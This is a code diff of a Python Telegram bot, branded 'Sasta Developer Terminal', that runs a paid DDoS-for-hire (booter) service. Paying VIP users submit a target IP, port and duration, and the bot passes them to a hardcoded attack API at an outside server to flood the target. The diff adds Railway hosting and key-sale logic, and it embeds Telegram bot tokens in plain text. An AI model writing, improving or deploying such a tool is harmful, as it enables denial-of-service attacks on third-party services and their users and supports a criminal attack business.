@@ -1,206 +1,149 @@
 import telebot
-import requests
 import time
+import json
 import random
 import string
-import json
 import os
 import threading
+import requests
+from flask import Flask
+from telebot import types
+
+# --- FLASK SERVER FOR RAILWAY ---
+app = Flask('')
+
+@app.route('/')
+def home():
+    return "Bot is Running!"
+
+def run_web():
+    # Railway provides a dynamic PORT, we must use it
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
 
 # --- CONFIGURATION ---
-TOKEN = "8605810780:AAHpOMnTfgzviFfbHIk2du8S7tAJKseaNzY"
+TOKEN = "8749691844:AAE36-_kLbm7H5XlPtXSTn-0liXRAQF9x-c"
 ADMIN_ID = 8787952549
-API_BASE = "http://13.203.155.253/attack"
-API_KEY_DDoS = "DESTRUCTED"
+API_URL = "http://13.203.155.253/attack"
 
 bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")
 
-active_attacks = []
-MAX_CONCURRENT = 2
+# --- GLOBAL TRACKING ---
+running_attacks = 0 
+active_attack_details = [] 
 
-# --- ROBUST DATABASE SYSTEM ---
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-USERS_FILE = os.path.join(BASE_DIR, "users.json")
-KEYS_FILE = os.path.join(BASE_DIR, "keys.json")
-
-def load_db(file_path):
-    if os.path.exists(file_path):
+# --- DATABASE SYSTEM ---
+def load_data(file, default):
+    if os.path.exists(file):
         try:
-            with open(file_path, "r") as f:
-                content = f.read().strip()
-                return json.loads(content) if content else {}
-        except Exception:
-            return {}
-    return {}
+            with open(file, "r") as f: return json.load(f)
+        except: return default
+    return default
 
-def save_db(file_path, data):
-    try:
-        with open(file_path, "w") as f:
-            json.dump(data, f, indent=4)
-    except Exception as e:
-        print(f"Error saving DB: {e}")
+def save_data(file, data):
+    with open(file, "w") as f: json.dump(data, f, indent=4)
 
-# Initial Load
-users = load_db(USERS_FILE)
-keys = load_db(KEYS_FILE)
+users = load_data("users.json", {})
+keys = load_data("keys.json", {})
 
-# --- UTILS ---
-def get_progress_bar(remaining, total):
-    filled = int(((total - remaining) / total) * 10)
-    bar = "▓" * filled + "░" * (10 - filled)
-    return f"[{bar}] {int(((total - remaining) / total) * 100)}%"
-
-def send_attack_request(target, port, duration):
-    try:
-        response = requests.get(
-            API_BASE, 
-            params={"ip": target, "port": port, "time": duration, "key": API_KEY_DDoS},
-            timeout=15
-        )
-        return response.status_code == 200
-    except:
-        return False
-
-def update_progress(chat_id, msg_id, target, port, duration):
-    start_time = time.time()
-    success = send_attack_request(target, port, duration)
-    
-    if not success:
-        bot.edit_message_text("❌ **API SERVER ERROR**\nAttack failed to trigger.", chat_id, msg_id)
-        global active_attacks
-        active_attacks = [a for a in active_attacks if a['target'] != target]
-        return
-
-    while time.time() - start_time < duration:
-        rem = int(duration - (time.time() - start_time))
-        progress = get_progress_bar(rem, duration)
-        try:
-            bot.edit_message_text(
-                f"🚀 **ATTACK IN PROGRESS** 🚀\n━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🎯 **TARGET:** `{target}:{port}`\n"
-                f"⏳ **TIME:** `{rem}s`\n"
-                f"📊 **PROGRESS:** `{progress}`\n"
-                f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"💥 **POWERED BY SASTA DEVELOPER**",
-                chat_id, msg_id
-            )
-        except:
-            break
-        time.sleep(5)
-    
-    try:
-        bot.edit_message_text(f"✅ **ATTACK COMPLETE**\nTarget `{target}` finished.", chat_id, msg_id)
-    except:
-        pass
-    active_attacks[:] = [a for a in active_attacks if a['target'] != target]
-
-# --- HANDLERS ---
-
+# --- START COMMAND ---
 @bot.message_handler(commands=['start'])
 def start(message):
     uid = str(message.from_user.id)
-    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
+    if uid not in users:
+        users[uid] = {"expiry": 0, "plan": "FREE", "name": message.from_user.first_name}
+        save_data("users.json", users)
     
-    current_users = load_db(USERS_FILE)
-    if uid not in current_users:
-        current_users[uid] = {"expiry": 0, "username": uname}
-        save_db(USERS_FILE, current_users)
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    markup.add("🚀 ATTACK", "👤 PROFILE", "🎫 REDEEM", "📜 HELP")
 
-    slots = f"{len(active_attacks)}/{MAX_CONCURRENT}"
-    role = "👑 ADMIN" if int(uid) == ADMIN_ID else "⭐ VIP" if current_users.get(uid, {}).get('expiry', 0) > time.time() else "🆓 FREE"
-    
-    dashboard = (
-        "🚀 **SASTA DEVELOPER TERMINAL** 🚀\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 **USER:** `{message.from_user.first_name}`\n"
-        f"💳 **PLAN:** `{role}`\n"
-        f"🛰️ **SLOTS:** `{slots}`\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "🛠️ **TERMINAL COMMANDS:**\n"
-        "👉 `/attack` - Stress Target\n"
-        "👉 `/running` - Live Attacks\n"
-        "👉 `/redeem` - Activate Key\n"
-        "👉 `/myid` - Your Info\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        "👑 **OWNER:** @sastadeveloper"
+    welcome = (
+        f"🔥 **SASTA DEVELOPER TERMINAL** 🔥\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 **User:** `{message.from_user.first_name}`\n"
+        f"💳 **Rank:** `{'ADMIN' if int(uid) == ADMIN_ID else 'VIP' if users[uid]['expiry'] > time.time() else 'FREE'}`\n"
+        f"🛰️ **Server:** `Railway Optimized`\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
     )
-    bot.send_message(message.chat.id, dashboard)
+    bot.send_message(message.chat.id, welcome, reply_markup=markup)
 
-@bot.message_handler(commands=['attack'])
-def attack_cmd(message):
+# --- ATTACK SYSTEM (LIMIT: 2 CONCURRENT) ---
+@bot.message_handler(func=lambda m: m.text == "🚀 ATTACK")
+def attack_request(message):
+    global running_attacks
     uid = str(message.from_user.id)
-    current_users = load_db(USERS_FILE)
     
-    if current_users.get(uid, {}).get('expiry', 0) < time.time() and int(uid) != ADMIN_ID:
-        bot.reply_to(message, "🚫 **VIP REQUIRED**\nRedeem a key first."); return
-    if len(active_attacks) >= MAX_CONCURRENT:
-        bot.reply_to(message, "⚠️ **SLOTS FULL**"); return
+    if users.get(uid, {}).get('expiry', 0) < time.time() and int(uid) != ADMIN_ID:
+        bot.reply_to(message, "🚫 **ACCESS DENIED!** Buy VIP."); return
+    
+    if running_attacks >= 2 and int(uid) != ADMIN_ID:
+        bot.reply_to(message, "⚠️ **SYSTEM BUSY!**"); return
+    
+    msg = bot.send_message(message.chat.id, "🎯 **Enter Target:** `IP PORT TIME`")
+    bot.register_next_step_handler(msg, run_attack)
 
+def run_attack(message):
+    global running_attacks
     try:
-        args = message.text.split()
-        if len(args) < 4:
-            bot.send_message(message.chat.id, "📝 **Usage:** `/attack <IP> <PORT> <TIME>`")
-            return
-        target, port, duration = args[1], args[2], int(args[3])
-        if duration > 300: duration = 300
+        ip, port, duration = message.text.split()
+        duration_int = int(duration)
         
-        active_attacks.append({"target": target, "end_time": time.time() + duration})
-        msg = bot.send_message(message.chat.id, "🛰️ **Initializing Terminal...**")
-        threading.Thread(target=update_progress, args=(message.chat.id, msg.message_id, target, port, duration)).start()
+        running_attacks += 1
+        attack_info = {"target": f"{ip}:{port}", "user": message.from_user.first_name, "end": int(time.time()) + duration_int}
+        active_attack_details.append(attack_info)
+
+        sent = bot.send_message(message.chat.id, "🚀 **Injecting Packets...**")
+        
+        def call_api_and_wait():
+            global running_attacks
+            headers = {"User-Agent": "Mozilla/5.0"}
+            full_url = f"{API_URL}?ip={ip}&port={port}&time={duration}&key=DESTRUCTED"
+            
+            try: requests.get(full_url, headers=headers, timeout=10)
+            except: pass
+            
+            bot.edit_message_text(f"🔥 **ATTACK STARTED**\n🎯 **Target:** `{ip}:{port}`\n⏳ **Time:** `{duration}s`", message.chat.id, sent.message_id)
+            time.sleep(duration_int)
+            
+            running_attacks -= 1
+            if attack_info in active_attack_details: active_attack_details.remove(attack_info)
+            bot.send_message(message.chat.id, f"✅ **ATTACK FINISHED**\n🎯 `{ip}:{port}`")
+
+        threading.Thread(target=call_api_and_wait).start()
     except:
-        bot.send_message(message.chat.id, "⚠️ **Invalid Attack Format.**")
+        bot.reply_to(message, "❌ **Format Error!**")
 
-@bot.message_handler(commands=['redeem'])
-def redeem(message):
-    uid = str(message.from_user.id)
-    try:
-        parts = message.text.split()
-        if len(parts) < 2:
-            bot.reply_to(message, "📝 **Usage:** `/redeem <KEY>`")
-            return
-        
-        input_key = parts[1].strip()
-        current_keys = load_db(KEYS_FILE)
-        current_users = load_db(USERS_FILE)
-        
-        if input_key in current_keys:
-            if current_keys[input_key]['used_by'] is None:
-                if uid not in current_users:
-                    current_users[uid] = {"expiry": 0, "username": f"@{message.from_user.username}" if message.from_user.username else str(uid)}
-                
-                now = time.time()
-                old_expiry = current_users[uid].get('expiry', 0)
-                current_users[uid]['expiry'] = max(old_expiry, now) + current_keys[input_key]['duration']
-                
-                current_keys[input_key]['used_by'] = f"@{message.from_user.username}" if message.from_user.username else str(uid)
-                
-                save_db(USERS_FILE, current_users)
-                save_db(KEYS_FILE, current_keys)
-                bot.reply_to(message, "👑 **VIP ACCESS GRANTED!**")
-            else:
-                bot.reply_to(message, f"❌ **Key already used by {current_keys[input_key]['used_by']}**")
-        else:
-            bot.reply_to(message, "❌ **Invalid Key.**")
-    except Exception:
-        bot.reply_to(message, "⚠️ **Redeem System Error.**")
-
-# --- ADMIN COMMANDS ---
+# --- ADMIN TOOLS ---
 @bot.message_handler(commands=['genkey'])
 def genkey(message):
     if message.from_user.id != ADMIN_ID: return
     try:
-        args = message.text.split()
-        days, count = int(args[1]), int(args[2])
-        current_keys = load_db(KEYS_FILE)
-        new_keys_list = []
-        for _ in range(count):
-            k = "SD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-            current_keys[k] = {"duration": days * 86400, "used_by": None}
-            new_keys_list.append(k)
-        save_db(KEYS_FILE, current_keys)
-        bot.send_message(message.chat.id, f"🎫 **KEYS GENERATED:**\n`" + "\n".join(new_keys_list) + "`")
-    except:
-        bot.reply_to(message, "Usage: `/genkey <days> <count>`")
+        days = int(message.text.split()[1])
+        key = "SD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
+        keys[key] = days * 86400
+        save_data("keys.json", keys)
+        bot.reply_to(message, f"🎫 **Key:** `{key}`")
+    except: bot.reply_to(message, "❌ `/genkey <days>`")
 
-print("v10.8 FINAL FIXED ONLINE...")
-bot.infinity_polling()
+@bot.message_handler(func=lambda m: m.text == "🎫 REDEEM")
+def redeem_key(message):
+    msg = bot.send_message(message.chat.id, "⌨️ **Enter Key:**")
+    bot.register_next_step_handler(msg, process_redeem)
+
+def process_redeem(message):
+    uid = str(message.from_user.id)
+    key = message.text.strip()
+    if key in keys:
+        duration = keys.pop(key)
+        users[uid]['expiry'] = max(users[uid].get('expiry', 0), time.time()) + duration
+        save_data("users.json", users)
+        save_data("keys.json", keys)
+        bot.send_message(message.chat.id, "✅ **VIP ACTIVATED!**")
+    else: bot.send_message(message.chat.id, "❌ **Invalid Key!**")
+
+# --- MAIN EXECUTION ---
+if __name__ == "__main__":
+    # Start Web Server for Railway Health Check
+    threading.Thread(target=run_web).start()
+    print(">>> Sasta Developer Railway Bot Live!")
+    bot.infinity_polling(skip_pending=True)
